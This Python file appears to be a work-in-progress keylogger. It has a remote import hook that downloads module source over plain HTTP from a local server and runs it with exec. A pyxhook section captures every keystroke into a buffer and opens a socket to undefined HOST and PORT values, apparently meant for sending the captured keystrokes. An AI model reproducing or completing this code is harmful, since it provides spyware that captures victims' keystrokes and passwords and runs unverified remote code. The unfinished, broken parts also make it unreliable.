from importlib.machinery import ModuleSpec
import sys
from types import ModuleType
from urllib.request import urlopen
import importlib.util
import importlib.machinery
import importlib.abc
 
#this file will load and remotely import modules from a url
 
 
class Finder(importlib.abc.MetaPathFinder):
 
    def __init__(self, base_url) -> None:
        self.base_url = base_url
 
    def find_spec(self, fullname, path, target=None):
        spec = self.find_py_file_spec(fullname)
        if spec is not None:
            return spec
        spec = self.find_package_spec_init(fullname)
        if spec is not None:
            return spec
        return None
 
    def find_py_file_spec(self, fullname):
        if len(fullname.split(".")) == 1:
            url = "{}/{}/{}.py".format(self.base_url,fullname.split(".")[0],fullname.replace(".","/"))
        else:
            url = "{}/{}.py".format(self.base_url,fullname.replace(".","/"))
        print(url)
        source = self.get_source_code(url)
        if source is None:
            print("no thing found")
            return None
        loader = Loader(fullname,source,url)
        return importlib.machinery.ModuleSpec(fullname, loader)
 
    def find_package_spec_init(self,fullname):
 
        url = "{}/{}/__init__.py".format(self.base_url,fullname.replace(".","/"))
        source = self.get_source_code(url)
        if source is None:
            print("no init found")
            return None
        loader = Loader(fullname,source,url,zip=True)
        return importlib.machinery.ModuleSpec(fullname, loader,is_package=True,)
 
    def get_source_code(self, url):
        try:
            response = urlopen("http://"+url)
        except Exception:
            return None
            print("import failed due to HTTP")
 
 
        source = response.read()
        return source
class Loader(importlib.abc.Loader):
 
    def __init__(self, name, source_code, url:str,zip=False) -> None:
        self.name = name
        self.source_code = source_code
        self.url = url
        self.zip = zip
 
    def create_module(self, spec: ModuleSpec) -> ModuleType | None:
        module = sys.modules.get(spec.name)
        if module is None:
            module = ModuleType(spec.name)
            sys.modules[spec.name] = module
        return module
 
    def exec_module(self, module: ModuleType) -> None:
        module.__file__ = self.url
        print("url is {}".format(self.url))
        
        
        exec(self.source_code, module.__dict__)
        return module
 
    def get_source(self,name):
        return self.source_code
 
def add_server(ip,port):
    sys.meta_path.append(Finder(f"{ip}:{port}"))
 
 
add_server("127.0.0.1",5003)

import pyxhook as hook_manager
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.setblocking(0)  # Set to non-blocking


buffer = ""

def OnKeyboardEvent(event):
    global buffer  # Access the global buffer variable

    if event.Key == 'space':
        buffer += ' '  # Use += for string concatenation
    elif event.Key == 'Return':
        buffer += '\n'
    elif event.Key == "BackSpace":
        buffer = buffer[:-1] #removes last character
    else:
        buffer += event.Key

    print(buffer)
    return True




# Create a new HookManager instance This is a test woooo
hm = hook_manager.HookManager()

# Set the hook for key down events
hm.KeyDown = OnKeyboardEvent

# Start hooking the keyboard
hm.HookKeyboard()

# Start the hook manager's monitoring loop in a separate thread.
hm.start()

# Keep the main thread alive to prevent the program from exiting
# (you can use a different method to keep your program running if needed)
try:
    while True:
        pass  # Do nothing, just keep the script alive
except KeyboardInterrupt:
    # Handle Ctrl+C to gracefully exit
    print(buffer)
    hm.cancel()
    print("Exiting...")